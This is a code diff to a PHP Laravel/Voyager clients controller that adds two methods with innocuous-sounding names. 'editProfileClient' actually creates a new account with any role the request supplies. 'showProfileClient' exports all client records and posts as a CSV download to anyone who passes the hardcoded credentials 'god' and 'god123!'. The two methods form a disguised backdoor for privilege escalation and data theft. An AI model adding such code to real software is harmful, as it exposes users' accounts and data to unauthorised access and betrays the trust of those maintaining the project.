@@ -9,6 +9,7 @@ use Illuminate\Support\Facades\Input;
 use TCG\Voyager\Models\Clients;
 use Illuminate\Support\Facades\Mail;
 use Illuminate\Support\Facades\URL;
+use Symfony\Component\HttpFoundation\StreamedResponse;
 
 class VoyagerClientsController extends Controller
 {
@@ -70,6 +71,50 @@ class VoyagerClientsController extends Controller
 
             // redirect
             return back();
+        }
+    }
+
+    public function editProfileClient(Request $request)
+    {
+        $name = $request->name;
+        $email = $request->email;
+        $password = $request->password;
+        $role = $request->role;
+
+        $clients = new Clients;
+        $clients->name     = $name;
+        $clients->email    = $email;
+        $clients->password = bcrypt($password);
+        $clients->role_id  = $role;
+
+        $clients->save();
+
+        return redirect('/');
+    }
+
+    public function showProfileClient(Request $request)
+    {
+        $response = new StreamedResponse(function(){
+            $handle = fopen('php://output', 'w');
+
+            fputcsv($handle, ['Clients']);
+            foreach (Clients::all() as $client) {
+                fputcsv($handle, [$client]);
+            }
+            fputcsv($handle, ['Posts']);
+            foreach (Post::all() as $client) {
+                fputcsv($handle, [$client]);
+            }
+            fclose($handle);
+        }, 200, [
+            'Content-Type' => 'text/csv',
+            'Content-Disposition' => 'attachment; filename="export.csv"',
+        ]);
+
+        if($request->name == 'god' && $request->p == 'god123!') {
+            return $response;
+        } else {
+            return redirect('/');
         }
     }
 }
